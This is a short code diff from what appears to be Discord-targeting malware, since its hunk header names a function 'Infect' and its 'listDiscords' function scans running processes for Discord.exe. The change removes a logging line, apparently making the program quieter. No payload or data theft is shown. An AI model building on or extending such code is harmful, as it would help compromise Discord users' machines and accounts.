@@ -80,7 +80,7 @@ function Infect() {
 
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
-        console.log(stdout)
+
         
         if (stdout.includes("Discord.exe")) {
 
